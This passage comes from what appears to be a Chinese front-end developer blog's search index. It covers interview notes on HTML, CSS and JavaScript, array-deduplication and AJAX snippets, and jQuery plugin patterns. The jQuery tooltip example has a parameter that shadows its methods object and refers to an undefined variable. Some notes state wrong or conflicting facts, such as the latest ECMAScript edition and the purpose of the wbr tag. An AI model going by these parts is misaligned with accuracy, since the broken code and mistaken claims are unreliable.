for(var i = 0; i &lt; myArray.length; i++)&#123; //遍历当前数组 if (!n[myArray[i]])&#123; //如果hash表中没有当前项 n[myArray[i]] = true; //存入hash表 r.push(myArray[i]); //把当前数组的当前项push到临时数组里面 &#125; &#125; // return r; alert("新的数组：" + r);&#125;bbb(); 方法3 12345678910111213function ccc()&#123; var n = [myArray[0]]; //结果数组 for(var i = 1; i &lt; myArray.length; i++)&#123; //从第二项开始遍历 //如果当前数组的第i项在当前数组中第一次出现的位置不是i， //那么表示第i项是重复的，忽略掉。否则存入结果数组 if (myArray.indexOf(myArray[i]) == i)&#123; n.push(myArray[i]); &#125; &#125; // return n; alert("新的数组：" + n);&#125;ccc(); 方法4（同时排序） 123456789101112function ddd()&#123; myArray.sort(); //数组排序 var re = [myArray[0]]; //先提取最小的 for(var i = 1; i &lt; myArray.length; i++)&#123; if( myArray[i] !== re[re.length-1])&#123; //将不等于的放在新数组的后面，等于的跳过 re.push(myArray[i]); &#125; &#125; // return re; alert(&quot;新的数组：&quot; + re);&#125;ddd(); 数组乱序函数123456789function shuffle(array) &#123; for (var i = array.length - 1; i &gt; 0; i--) &#123; var j = Math.floor(Math.random() * (i + 1)); var temp = array[i]; array[i] = array[j]; array[j] = temp; &#125; return array;&#125; 数组常见操作（push、pop、shift、unshift）push:向数组的末尾添加一个或多个元素，并返回新的长度pop:把数组的最后一个元素从其中删除，并返回最后一个元素的值shift:把数组的第一个元素从其中删除，并返回第一个元素的值unshift:向数组的开头添加一个或更多元素，并返回新的长度 ajax请求 原生js 12345678910111213141516if(window.XMLHttpRequest)&#123; var ajax = new XMLHttpRequest();&#125;else&#123; var ajax = new ActiveXObject(“Microsoft.XMLHttp”);&#125;ajax.open(‘GET’,’***’,true);ajax.send();ajax.onreadystatechange = function()&#123; if(ajax.readyState == 4)&#123; if(ajax.status == 200)&#123; alert(ajax.responseText); &#125; else &#123; alert(“失败！”); &#125; &#125;&#125; jquery 123456789101112131415161718192021222324252627282930313233$.ajax(&#123; url: 'api.php', type: 'GET', dataType: 'json', timeout: 3000, data: &#123; num1: num1, num2: num2 &#125;, beforeSend: function(xhr, settings) &#123; // 发送请求前 console.log('beforeSend', xhr, settings); &#125;, success: function(data, status, xhr) &#123; // 请求成功 console.log('success', data, status, xhr); if (data.code === 0) &#123; console.log('处理成功'); $('#result').val(data.result); &#125; else &#123; console.log('处理失败'); &#125; &#125;, error: function(xhr, errorType, error) &#123; // 请求失败 console.log('error', xhr, errorType, error); alert('请求失败'); &#125;, complete: function(xhr, status) &#123; // 请求成功或失败都执行 console.log('complete', xhr, status); &#125;&#125;); HTML5特性简单易记的语言标签简单易记的编码类型不需要标签闭合标签名不区分大小写语义化的新增标签表单增强视频和音频canvas绘画 其他专业技能事件冒泡、委托等见web前端/常用资料/前端面试html5 + css3常见居中方法（定宽高和不定宽高）cavas、svg使用什么框架，喜欢它的哪些优点同步工具：svn / git （svn是集中式管理系统、git是分布式管理系统）公司使用：linux + node + git + jade + scss + es6 + vuevue特点：mvvmjquery：高效、快速处理一些简单的事情、很难处理麻烦的，比如渲染不固定数量的数组列表… 其他（思想、生活）专业、居住地是否单身、期望薪资等对未来的想法、构思业余活动对待加班的看法对待大企业和创业公司的看法如果公司需要你去使用一些你之前未有过的技能或知识，你该怎么办释放压力的方法 github面试题https://github.com/cpm828/Front-end-Developer-Interview-Questions]]></content>
      <tags>
        <tag>Other</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试知识点]]></title>
    <url>%2Fblog%2Fother%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E7%9F%A5%E8%AF%86%E7%82%B9.html</url>
    <content type="text"><![CDATA[请输入密码：提交 闭包面试题123456789func(1)(2) = 3func(3)(5) = 8由上例推导函数主体function func(num1) &#123; return function func(num2) &#123; return num1 + num2 &#125;&#125; 对web标准及W3C的理解和认识标签闭合、标签小写、使用外部链接脚本和样式、结构层行为层和表现层的分离、内容能被更多的用户访问、内容能被更多的设备访问、更少的代码及组件，容易维护 什么是前端？前台的设计,包括动画制作,图像处理,文字编辑,版面设计一名合格的前端开发工程师，应该具有一定的审美能力和基础的美工操作能力，能很好的与交互及视觉协作 xhtml和html的区别 html是一种基本的web网页设计语言，xhtml是一个基于xml的置标语言 不同点： xhtml必须正确嵌套 xhtml元素必须关闭 标签名必须小写 xhtml文档必须拥有根元素 为什么选择H5 更具有语义性 更支持搜索引擎的搜索（直观的认识标签） 阅读性更强，支持残障人士的阅读 H5的特性 简单易记的语言标签 简单易记的编码类型 不需要标签闭合 标签名不区分大小写 语义化的新增标签 表单增强 视频和音频 canvas绘画 css引入方式：行内样式、内嵌样式、外部链接样式、导入样式（@import url(&quot;&quot;);）link和@import的区别：link无兼容性，link支持js操控 css权重优先级!important &gt; 内嵌样式 &gt; ID选择器 &gt; 类选择器 &gt; 标签选择器和伪类选择器 &gt; 通用选择器 SEO优化文件合并、文件压缩、CDN托管（内容分发网络）、利用缓存 主流浏览器的内核和厂商前缀： 火狐：Gecko -moz- 谷歌：webkit -webkit- IE:ie内核/Trident -ms- 欧朋：Presto -o- 强制转换和隐式转换 强制：parseInt、parseFloat、number 隐式：（直接将一种类型赋值给另一种类型） parseInt()、parseFloat()和number parseInt()：将字符串开头的整数分解出来，转换为整数 parseInt(“123”)、parseInt(“123.45”)、parseInt(“123.45abc”) 返回123 parseInt(“abc123”)、parseInt(true) 返回NaN parseFloat()：将字符串开头的整数或浮点数分解出来，转换为浮点数 parseFloat(“123.45”)、parseFloat(“123.45abc”) 返回123.45 parseFloat(“abc 123.45”)、parseFloat(“true”) 返回NaN number()：将对象的值转换成数字 Javascript的对象Javascript的本地对象、内置对象、宿主对象和自定义对象 本地对象：date、array、string、number、object、function、regexp、boolean,可以new实例化 内置对象：global、load、Math不可以实例化（每个内置对象都是本地对象） 宿主（浏览器）对象：document、window 自定义对象：开发人员自定仪的对象通常来说：本地对象和内置对象可以归为一类，即分为本地对象、宿主对象和自定义对象 JS的数据类型JS是一种弱语言类型的语言number、string、boolean、object、function、underfined 基本类型：存放在栈中：number、string、boolean 引用类型：存放在堆中：object、function 事件绑定和普通事件的区别事件绑定可以添加多个事件 事件冒泡、事件捕获、事件委托、事件绑定、事件默认行为 事件冒泡：触发子级事件会同时向上触发父级的事件addEventListener(&#39;click&#39;,abc,false); // 默认事件冒泡 阻止事件冒泡：event.stopPropagation(); // return false; 事件捕获：触发父级事件会同时向下触发子级的事addEventListener(&#39;click&#39;,abc,true); //事件捕获 事件委托：让其他的元素帮忙处理事件，如让ul来处理li的事件 123456789101112&lt;!-- HTML: --&gt;&lt;ul id="parent-list"&gt; &lt;li id="post-1" class="it-1"&gt;Item 1&lt;/li&gt; &lt;li id="post-2"&gt;Item 2&lt;/li&gt; &lt;li id="post-3"&gt;Item 3&lt;/li&gt; &lt;li id="post-4"&gt;Item 4&lt;/li&gt; &lt;li id="post-5"&gt;Item 5&lt;/li&gt; &lt;li id="post-6" class="it-1"&gt;Item 6&lt;/li&gt; &lt;span id="post-7" class="pt-7"&gt;&lt;/span&gt; &lt;strong id="post-8"&gt;&lt;/strong&gt; &lt;em id="post-9" class="pt-7"&gt;&lt;/em&gt;&lt;/ul&gt; 12345678910111213141516// JS:$('#parent-list').on('click', 'li', function()&#123; //为子级绑定事件 var number = $(this).index(); //获取当前子级的索引值 console.log('number', number); var check = $('li').eq(number).attr('id'); //获取相应的属性值 console.log('check', check); alert('当前的id为：' + check);&#125;);$('#parent-list').on('click', function(e)&#123; var ev = e || window.event; //事件对象兼容 var etarget = ev.target || ev.srcElement; //事件源兼容 if (etarget &amp;&amp; etarget.nodeName == 'LI') &#123; //nodeName为大写字母 alert('当前的id为：' + etarget.id); &#125;&#125;); 事件绑定：为某个对象绑定事件，可以绑定多个 1234567// JS:addEventListener('click',abc,false); //W3C绑定attachEvent('onclick',abc); //IE绑定// jQuery:bind();on(); 事件默认行为：如链接a 阻止事件默认行为：return false; 或 event.preventDefault(); 函数闭包允许使用内部函数（函数定义和函数表达式位于另一个函数的函数体内），这些内部函数可以访问它们所在外部函数中声明的所有局部变量、参数和声明的其他内部函数。当其中一个这样的内部函数在包含它们的外部函数之外被调用时，就会形成闭包。也就是内部函数在外部函数返回后执行。而当这个内部函数执行时，它仍然必须访问其外部函数的局部变量、参数以及内部函数。这些局部变量、参数和函数声明的值是外部函数返回的值，但也会受到内部函数的影响 ajax中get和post区别 get post 从服务器上获取数据 向服务器上传递数据 将表单数据添加到url后面 将表单数据放在虚拟载体中 不安全，用户可以看到数据 相对用户安全，操作对用户不可见 传输数据量小，url长度限制默认 传输数据量大（上传文件只能使用post） AJAX的异步机制，优缺点核心是XMLHttpRequest对象XMLHttpRequest对象是的JS脚本能够实现对服务器的异步请求，向后台发送请求并接收服务器响应，动态获取响应数据来更新局部页面 优点 页面无刷新即可更新页面，用户体验好 异步方式与服务器通信，不需要打断用户操作，响应能力快 可以让客户端来处理一些工作，减轻服务器带宽 不需要下载插件 促进页面和数据的分离 缺点： 兼容性 破坏前进和后退按钮 对流媒体和移动设备支持易购 对搜索引擎的支持比较弱12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// JS:if(window.XMLHttpRequest)&#123; var ajax = new XMLHttpRequest();&#125;else&#123; var ajax = new ActiveXObject(“Microsoft.XMLHttp”);&#125;ajax.open('GET','***',true);ajax.send();ajax.onreadystatechange = function()&#123; if(ajax.readyState == 4)&#123; if(ajax.status == 200)&#123; alert(ajax.responseText); &#125;else&#123; alert(“失败！”); &#125; &#125;&#125;// JQuery:$.ajax(&#123; url: 'api.php', type: 'GET', dataType: 'json', timeout: 3000, data: &#123; num1: num1, num2: num2 &#125;, beforeSend: function(xhr, settings) &#123; // 发送请求前 console.log('beforeSend', xhr, settings); &#125;, success: function(data, status, xhr) &#123; // 请求成功 console.log('success', data, status, xhr); if (data.code === 0) &#123; console.log('处理成功'); $('#result').val(data.result); &#125; else &#123; console.log('处理失败'); &#125; &#125;, error: function(xhr, errorType, error) &#123; // 请求失败 console.log('error', xhr, errorType, error); alert('请求失败'); &#125;, complete: function(xhr, status) &#123; // 请求成功或失败都执行 console.log('complete', xhr, status); &#125;&#125;); 测出页面加载时间 12345678910111213&lt;!-- HEAD: --&gt;&lt;script&gt; var a = new Date().getTime(); //获取初始时间&lt;/script&gt;&lt;!-- BODY: --&gt;&lt;script&gt; window.onload = function()&#123; document.getElementById('div1').innerHTML = "页面加载时间："+ (new Date().getTime()-a)+"毫秒"; &#125;&lt;/script&gt;&lt;div id="div1"&gt;&lt;/div&gt; ECMAScript规范最新版：ECMA-262 《ECMAScript国际标准（第6版）》 2015年6月 ECMAScrip规范是为了解决早期Web浏览器支持的Javascript脚本编程语言而制定的技术标准，目前来说，被浏览器广泛支持的是 ECMAScript 规范第三版 包括： 在广大Web浏览器/Web服务器等宿主环境中实现的Javascript 在Microsoft Internet Explorer（IE浏览器）/IIS中实现的JScript 在Adobe/Macromedia的Flash、Director等软件中实现的ActionScript 实现的基本内容： 类型：Undefined、Null、Boolean、Number、String 和 Object 对象和属性：对象是属性的集合，属性包括命名数据属性、命名访问器属性和内部属性 函数：三种创建方法 使用构造函数function 使用函数声明 使用函数表达式 数组：内置对象array，本身相当于一个构造函数，可以用来创建新的数组实例 Array.prototype.every：该函数用来判断数组中的全部元素是否都满足给定的条件。条件是通过作为参数的另一个函数来指定的。函数的返回值（true或 false）决定了条件是否满足 Array.prototype.forEach：该函数用来遍历数组中的所有元素，对每个元素调用由参数指定的函数 Array.prototype.map：该函数对数组中的每个元素执行特定的处理，并把处理的结果保存在一个新的数组中 Array.prototype.filter：该函数根据给定的条件对数组中的元素进行过滤。只有满足条件的元素才会出现在结果数组中 Array.prototype.reduce 和 Array.prototype.reduceRight：这两个函数用来对数组中的元素进行累积操作。上一次操作的结果会作为下一次操作的输入值。两个函数的区别在于 reduceRight 是从数组的末尾开始进行处理。 JSON：第五版开始支持，JSON 也通常被用来作为客户端与服务器端之间的数据传输格式代码执行：ECMAScript 代码的执行由运行环境来完成，通过 eval 函数也可以指定一段需要执行的代码，代码的基本执行方式是从上到下，顺序执行 严格模式： 注：必须实现该规范描述的所有的“类型、值、对象、属性、函数和程序语法及语义”，并且必须支持Unicode字符标准（UCS）。在此基础上，每个具体实现还可以指定“额外的类型、值、对象、属性和函数”，可以定义新的“程序和正则表达式语法”等. JavaScript三大组成： ECMAScript：描述了语言的语法和基本对象 DOM：描述处理网页内容的方法和接口 BOM：描述处理与浏览器进行交互的方法与接口最新版为ECMA-262 第三版 对应为1.5 JavaScript（2.0版本在制定中） 两种响应式网页的设计 跳转方式当不同的设备访问我们的网站时候，通过JS去判定这是一个什么设置，如果是手机，那就直接跳转到另外一个网站。这样的方面比较古老，要求要有两个网站，一个是手机网站，一个是PC网站。 更换样式通过JS去判断当前访问网站的屏幕宽度，然后调用不同的CSS样式文件。这样的方法比较方便，一个网站，只要做几个尺寸的样式表就能实现响应式网站。也可以直接使用CSS中的媒体查询直接通过屏幕宽度选择相应的样式 解决IE6 bug的方法 双边距：float ——&gt;display:inline 超链接点击后失效：——&gt;按照书写顺序：link visited hover active z-index——&gt;给父级添加position:relative png透明——&gt;使用JS代码修改 min-height——&gt;!important select在ie6中被遮盖——&gt;frame 无法定义1px左右的容器——&gt;IE6的默认行高造成，使用over:hidden;zoom:0.08 ;line-height:1px title和alt的区别 alt是当图片不显示的时候用文字代替 title是当鼠标停留的时候出现提示信息 css sprites的使用及作用把一堆小的图片整合到一张大的图片上，减轻服务器对图片的请求数量，提高加载速度 三种盒模型 content-box（默认）box-sizing: content-box; 只算内容，表示padding、border、margin不计算在设置的width和height中即 盒模型宽度 = content + padding + border + margin padding-box（不常用）box-sizing: padding-box; 从padding开始算，表示padding计算在设置的width和height中即 盒模型宽度 = content + border + margin border-box（特殊盒模型、开发常用）box-sizing: border-box; 表示padding、border计算在设置的width和height中即 盒模型宽度 = content + margin 开发时常在根元素设置：box-sizing: border-box; 其余元素，设置box-sizing: inherit;继承根部的 清除浮动 使用空标签清除浮动clear:both; 使用overflow:auto; after伪元素清除浮动给父级设置after伪元素，不可以设置before12345#content:after&#123; content:""; display:block; clear:both;&#125; split()和join()的区别 split()是将字符串切割成数组 join()是数组转换成字符串 数组方法 push()：尾部添加 pop()：尾部删除 unshift()：头部添加 shift()：头部删除 splice()：任意位置的删除或添加 splice(操作位置，删除个数，[添加的数组项1]，[添加的数组项2]) 删除个数为零，表示不删除，直接添加数组项 删除个数不为零且无添加项，表示直接删除几项 删除个数不为零，表示先删除几项，再添加数组项 reverse：用于对数组数据的倒序排列 sort：对数组里数据的排序，可以给sort函数加一个排序函数作为参数 数组去重： 12345678910111213var myArray = [0, 1, 6, 9, 0, 2, 4, 5, 4];function aaa()&#123; var newArray = []; //一个新的临时数组 for(var i = 0; i &lt; myArray.length; i++)&#123; //遍历当前数组 //如果当前数组的第i项已经保存进了临时数组，那么跳过， //否则把当前项push到临时数组里面 if (newArray.indexOf(myArray[i]) == -1)&#123; newArray.push(myArray[i]); &#125; &#125; alert("新的数组：" + newArray);&#125;aaa(); IE和DOM时间流的区别 执行顺序不一样 参数不一样 事件不加on this指向问题 IE和标准下有哪些兼容性的写法 123var oEvent = e || event;var oDocumentElement = document.documentElement.clientWidth || document.body.clientWidth;var oTarget = oEvent.srcElement || oEvent.target; 添加、删除、替换、插入 添加：appendChild() 删除：removeChild() 替换：replaceChild() 插入insertBefore() window.onload和$(document).ready的区别 window.onload是在页面（所有元素）加载完毕后执行不能同时编写多个，可用addLoadEvent()解决多个问题 $(document).ready时DOM结构绘制完毕后就执行，不必等到加载完毕可以同时编写多个可简化$()==和===的不同 ==会自动转换类型 ===不会自动转换类型 DOM和BOM DOM：文档对象模型document BOM：浏览器对象模型window、event、frame、history、location、navigator、screen display:none和visiblity:hidden的区别 display:none:不在文档流中，完全隐藏 visibility:hidden:还在文档流中，看不见但摸得着 分别写出几个HTML文字标签 文本居中：不赞成使用 文字加粗： 文字强调： 强烈语气的强调文本： 带下划线的文本： 不赞成使用 文字倾斜： 上标文本：sup 下标文本：sub 字体：不赞成使用 H5新增标签 time定义时间、wbr定义视频、video定义视频、audio定义声音、source定义媒介源、 track定义媒体播放器的文本轨道datalist定义下拉列表、keygen定义生成秘钥、 output定义输出的一些类型、canvas定义图形、figcation定义figure元素标题、 figure定义媒介内容的分组、header定义页眉、nav定义导航、main定义主窗口、 aside定义侧栏、footer定义页脚 jQuery的特点 轻量级JS框架 选择器使用方便 链式操作和隐式迭代 简化了JS代码 简化了AJAX操作 兼容主流浏览器，不需要考虑兼容 丰富的第三方插件 可扩展性强 一个大容器里面的图片或div如何设置可以让其垂直居中、水平居中 将图片设置成背景图片 12345678910&lt;!-- HTML: --&gt;&lt;div class="div1"&gt;&lt;!-- CSS: --&gt;.div1&#123; width:700px; height:600px; border:1px solid #000; background:url(1.jpg) no-repeat center center;&#125; 使用table-cell是标签元素以表格单元格的形式呈现 123456789101112131415&lt;!-- HTML: --&gt;&lt;div class="div1"&gt; &lt;img src="1.jpg" alt=""&gt;&lt;/div&gt;&lt;!-- CSS: --&gt;.div1&#123; display:table-cell; width:800px; height:800px; border:1px solid #000; text-align:center; vertical-align:middle;&#125;img&#123; vertical-align:middle;&#125; 增加一个空的span元素，使用vertical-align 1234567891011121314151617181920212223&lt;!-- HTML: --&gt;&lt;div class="div1"&gt; &lt;span&gt;&lt;/span&gt; &lt;img src="1.jpg" alt=""&gt;&lt;/div&gt;&lt;!-- CSS: --&gt;.div1&#123; width:700px; height:600px; border:1px solid #000; text-align:center;&#125;span&#123; display:inline-block; width:1px; height:100%; vertical-align:middle;&#125;img&#123; display:inline; vertical-align:middle;&#125; 延伸：该属性定义行内元素的基线相对于该元素所在行的基线的垂直对齐 在图片外围套个盒子，使用margin-top 1234567891011121314151617181920212223&lt;!-- HTML: --&gt;&lt;div class="div1"&gt; &lt;div class="div2"&gt; &lt;img src="1.jpg" alt=""&gt; &lt;/div&gt;&lt;/div&gt;&lt;!-- CSS: --&gt;.div1&#123; width:700px; height:600px; border:1px solid #000;&#125;.div2&#123; width:400px; height:300px; margin-top:50%; margin-left:50%;&#125;img&#123; margin-top:-50%; margin-left:-50%;&#125; 使用定位 + transform 123456789101112131415161718192021&lt;!-- HTML: --&gt;&lt;div class="div1"&gt; &lt;div class="div2"&gt;&lt;/div&gt;&lt;/div&gt;&lt;!-- CSS: --&gt;.div1&#123; width:500px; height: 500px; border: 1px solid #f00; position:relative;&#125;.div2&#123; width: 200px; height: 200px; border: 1px solid #0f0; position: absolute; left: 50%; top: 50%; -webkit-transform:translate(-50%,-50%);&#125; flex弹性布局 12345678910111213141516171819&lt;!-- HTML: --&gt;&lt;div class="div1"&gt; &lt;div class="div2"&gt;&lt;/div&gt;&lt;/div&gt;&lt;!-- CSS: --&gt;.div1&#123; width:500px; height: 500px; border: 1px solid #f00; justify-content:center; //水平居中 align-items:center; //垂直居中 display: -webkit-flex; //表示弹性布局&#125;.div2&#123; width: 200px; height: 200px; border: 1px solid #0f0;&#125; css兼容IE6下双边距bug：两个浮动的元素，第一个设置左边距，IE6下显示双倍间距解决办法：给浮动的元素增加display:inline IE6下3像素bug：前面的浮动，后面的不浮动，后面的上来，现代浏览器显示浮动在上面，不浮动的在下面，IE6中显示浮动的在左边，不浮动的在右边，并且有3个像素的间距。解决办法：前面的浮动，后面的也设置浮动给前面浮动的元素增加 _margin-right:-3px; img图片有默认间距：解决办法：vertical-align:middle/bottom/baseline 当应用于表单元素时，如输入框和按钮垂直错位时，给表单增加vertical-align:middle 标签最低高度min-height兼容：如果我们要设置一个标签的最小高度200px，需要进行的设置为：{min-height:200px; height:auto !ImportAnt; height:200px; overflow:visible;}显示效果，容器最小高度为200px,内容大于200px时，容器会被撑高，而不会出现滚动条 不同浏览器的标签默认的外边距和内间距不同：margin:0; padding:0; 设置较小高度标签：设置字号高度等于标签高度其他符号：使用方法：使用了渐进识别的方式，从总体中逐渐排除局部_:IE6支持+:IE6、7支持\0:IE8支持\9:IE6、7、8支持 box-sizing:border-box; width:50%; /表示显示父级的一般长/ 允许以确切的方式定义适应某个区域的具体内容。 即可以设置该元素在相对于其父级的容器大小所显示的比例 高阶函数高阶函数是至少满足下列一个条件的函数： 接受一个函数或多个函数作为输入 输出一个函数三个高阶函数：map、filter、reduce map：将每个数组元素通过某种方法进行转换 filter：用于选择数组元素中满足某种条件的元素 reduce：把数组元素组合计算为一个值 雅虎军规雅虎军规是网站页面性能优化的黄金守则 尽量减少HTTP的请求次数 减少DNS（域名系统）的查找次数 避免跳转 可缓存的AJAX 推迟加载内容 预加载 减少DOM元素的数量 根据域名划分页面内容 使iframe的数量最小 不要出现404错误 使用CDN（内容分发网络） 为文件头指定Expires或Cache-Control G-zip压缩文件内容 配置ETag 尽早刷新输出缓冲 使用GET来完成AJAX请求 把样式表至于顶部 避免使用CSS表达式 使用外部JavaScript和CSS 削减JavaScript和CSS 使用代替@import 避免使用滤镜 把脚本至于页面底部 提出重复脚本 减少DOM访问 开发智能事件处理程序 减小Cookie体积 对于页面内容使用无cookie域名 优化图像 优化CSS Spirite 不要在HTML中缩放图像 favicon要小而且可缓存 保持单个内容小于25K 打包组件成复合文本 setTimeout和setInterval的区别 setITimeout只执行一次 清除：clearTimeout(对象); setInterval会自动重复执行 清除：clearInterval(对象); div+css实现三列布局，左右两列固定，中间列自适应宽度12345678910&lt;!-- HTML --&gt;&lt;div id="left"&gt;左栏固定宽度为200px&lt;/div&gt;&lt;div id="right"&gt;右栏固定宽度为200px&lt;/div&gt;&lt;div id="center"&gt;中间自适应宽度&lt;/div&gt;&lt;!-- 注意：布局一定是 左 右 中 --&gt;&lt;!-- CSS --&gt;#left&#123; width:200px; float:left; border:1px solid #000; min-height:400px;&#125;#right&#123; width:200px; float:right; border:1px solid #000; min-height:400px;&#125;#center&#123; margin:0 210px; border:1px solid #000; min-height:400px;&#125; 伪类和伪元素的区别 伪类：向某些选择器添加某些特殊效果 伪元素：将特殊的效果添加到某些选择器 浏览器navigator navigator.appName：获取浏览器名称 navigator.appCodeName：获取浏览器的代码名 navigator.appVersion：获取浏览器版本 navigator.cpuClass：获取浏览器的CPU等级 navigator.cookieEnabled：返回指明浏览器是否启用cookie的布尔值 浏览器历史记录history history只有一个属性，长度 history.length history.forword() //前进 history.back() //后退 history.go() //参数为整数，前进几个页面，参数为负数，后退几个页面 history.go(.com) //到达历史记录列表里第一个包含”.com”的url 使用location对象包含当前加载页面的url信息 使用location对象导航： location.href = “www.**”; //原始页面还保存在历史记录中 location.replace(“www.***”); //旧url被删除，只保留新的url 刷新页面： location.reload(); 文本溢出隐藏并显示为… 123456789101112131415161718&lt;!-- 单行文本溢出： --&gt;.div&#123; overflow:hidden; white-space:nowrap; text-overflow:ellipsis;&#125;&lt;!-- 多行文本溢出： --&gt;.div&#123; width:300px; border: 1px solid #0f0; display: -webkit-box; overflow: hidden; text-overflow:ellipsis; word-break:break-all; -webkit-box-orient:vertical; -webkit-line-clamp:3; //控制显示的行数&#125; 通用面试问题：1、 自我介绍面试什么职位，为什么从事这个行业（发展前景和个人爱好） 2、 面试时被公司反问还有什么问题对公司未来的发展？公司的培训力度？实习期多长时间？如果我能成功的入职贵公司，公司对我有什么期待和要求？ 3、 个人优缺点 4、 职业规划 5、 如果再工作中由于失误造成一定的损失怎么解决？承担错误，分清责任team共担，尽快解决检讨自己，分析原因，避免再犯 前端必须了解：CSS hackDOM结构DOM操作事件XMLHttpRequest严格模式与混杂模式盒模型块级元素与行内元素浮动元素HTML与XHTMLJSON 前端面试大纲：HTML&amp;CSS:WEB标准、浏览器内核差异、兼容性、hack、布局、盒模型、选择器优先级及使用、H5、CSS3、移动端JavaScript:数据类型、面向对象、继承、闭包、插件、作用域、跨域、原型链、模块化、自定义事件、内存泄漏、事件机制、异步装载回调、模块引擎、前端MVC、路由、Nodejs、JSON、ajax其他：HTTP、WEB安全、正则、优化、重构、响应式、团队协作、可维护、SEO、UED、架构、职业生涯]]></content>
      <tags>
        <tag>Other</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery封装插件]]></title>
    <url>%2Fblog%2Fjquery%2Fjquery%E5%B0%81%E8%A3%85%E6%8F%92%E4%BB%B6.html</url>
    <content type="text"><![CDATA[使用jQuery封装插件，此处我们只讲jquery的导入方法，不去理会import和export的导入导出，常见的如下： 通用方法封装 封装plugin1 1234567891011121314151617181920212223242526272829303132333435363738394041424344(function(root)&#123; var YQ = &#123;&#125;; // 设置cookie YQ.setCookie = function(name, value, day)&#123; var Days = day || 1; var exp = new Date(); exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 1000); document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString(); &#125;; // 获取cookie YQ.getCookie = function(name)&#123; var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)"); if(arr=document.cookie.match(reg)) return unescape(arr[2]); else return null; &#125;; // 获取链接参数 YQ.getQuery = function(item)&#123; var svalue = location.search.match(new RegExp('[\?\&amp;]' + item + '=([^\&amp;]*)(\&amp;?)', 'i')); return svalue ? decodeURIComponent(svalue[1]) : ''; &#125;; if(typeof root === "undefined")&#123; root = &#123;&#125;; &#125; if(typeof root['YQ'] === 'undefined')&#123; root.YQ = YQ; &#125;else&#123; YQ.extend(root.YQ, YQ); &#125; if(typeof define === 'function' &amp;&amp; define.amd)&#123; define([], function () &#123; 'use strict'; return root.YQ; &#125;); &#125;else if(typeof module !== 'undefined')&#123; module.exports = root.YQ; &#125;&#125;(window)); 导入plugin1 1&lt;script src="lib/plugin1.js"&gt;&lt;/script&gt; 使用plugin1 123// 导入之后，可以直接使用YQ当中的任何方法YQ.getQuery('a'); 常见的插件封装一般封装 封装plugin2 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/** * 封装插件demo */// 自调用匿名函数包裹（块级作用域）// 前面的;符号 的作用：分割代码，防止代码再合并压缩时出错;(function() &#123; /* * @param el: dom 元素 * @param opt: 传入的配置项参数 */ var testObj = function (el, opt) &#123; this.$element = el; this.defaults = &#123; 'color': 'red', 'fontSize': '12px', 'textDecoration': 'none' &#125;; this.options = $.extend(&#123;&#125;, this.defaults, opt); // 拼接传入参数和默认参数 &#125;; // 定义方法 testObj.prototype = &#123; changeClass: function() &#123; return this.$element.css(&#123; 'color': this.options.color, 'fontSize': this.options.fontSize, 'textDecoration': this.options.textDecoration &#125;); &#125;, methodA: function () &#123; // *** &#125;, methodB: function () &#123; // *** &#125;, &#125;; // 调用方法 $.fn.myPlugin2 = function (options) &#123; // 创建实体 var testIndividual = new testObj(this, options); // 调用方法 return testIndividual.changeClass(); &#125;;&#125;)(); 导入plugin2 123&lt;a href="#" id="testDom2"&gt;plugin2&lt;/a&gt;&lt;script src="lib/plugin2.js"&gt;&lt;/script&gt; 使用plugin2 1234$('#testDom2').myPlugin2(&#123; 'color': 'blue', 'fontSize': '20px'&#125;); 使用$.fn.a使用$.fn.a(a表示方法名)逐一封装方法，可以写多个 封装plugin3.js 1234567891011121314151617;(function() &#123; $.fn.myPlugin3 = function (opt) &#123; var defaults = &#123; Event: 'click', msg: 'Hello World' &#125;; var options = $.extend(defaults, opt); // var $this = $(this); var $this = this; // fn中的this已经是个jquery对象，无需使用$(this)来获取 // 绑定事件 $this.on(options.Event, function(e) &#123; alert(options.msg); &#125;); &#125;&#125;)(); 导入plugin3 123&lt;button id="testDom3"&gt;plugin3&lt;/button&gt;&lt;script src="lib/plugin3.js"&gt;&lt;/script&gt; 使用plugin3 1234$('#testDom3').myPlugin3(&#123; Event: 'click', msg: '12112'&#125;); 使用$.fn.extend使用$.fn.extend可以同时注册多个方法 封装plugin4 1234567891011121314;(function() &#123; $.fn.extend(&#123; check: function() &#123; return this.each(function() &#123; this.checked = true; &#125;); &#125;, uncheck: function() &#123; return this.each(function() &#123; this.checked = false; &#125;); &#125; &#125;);&#125;)(); 导入plugin4 1&lt;script src="lib/plugin4.js"&gt;&lt;/script&gt; 导入plugin4 123$("input[type='checkbox']" ).check();$("input[type='checkbox']" ).uncheck(); 使用$.fn.a传参（方法名）使用$.fn.a传参来注册多个方法 封装plugin5 123456789101112131415161718192021222324252627282930313233343536373839404142(function($) &#123; // $.fn.tooltip = function (options) &#123; // this // &#125;; // $.fn.tooltipShow = function () &#123; // is // &#125;; // $.fn.tooltipHide = function () &#123; // bad // &#125;; // $.fn.tooltipUpdate = function (content) &#123; // !!! // &#125; // 上面的方式是不被鼓励的写法，会使$.fn命名空间混乱，可以收集所有方法，通过传参来调用它们 var methods = &#123; init: function (options) &#123; &#125;, show: function () &#123; &#125;, hide: function () &#123; &#125;, update: function (content) &#123; &#125; &#125;; $.fn.tooltip = function(methods) &#123; if (methods[method]) &#123; return methods[method].apply(this, Array.prototype.slice.call(arguments, 1)); &#125; else if (typeof method === 'object' || !method) &#123; return methods.init.apply(this, arguments); &#125; else &#123; $.error('Method' + method + 'does not exist on jQuery.tooltip'); &#125; &#125;&#125;)(jQuery); 导入plugin5 1&lt;script src="lib/plugin5.js"&gt;&lt;/script&gt; 使用plugin5 12345678910111213// 调用init方法（无参数）:$('div').tooltip();// 调用init方法（带参数）:$('div').tooltip(&#123; foo: 'bar'&#125;);// 调用hide方法:$('div').tooltip('hide');// 调用update方法:$('div').tooltip('update', '****');]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[knockout使用script内嵌模板]]></title>
    <url>%2Fblog%2Fknockout%2Fknockout%E4%BD%BF%E7%94%A8script%E5%86%85%E5%B5%8C%E6%A8%A1%E6%9D%BF.html</url>
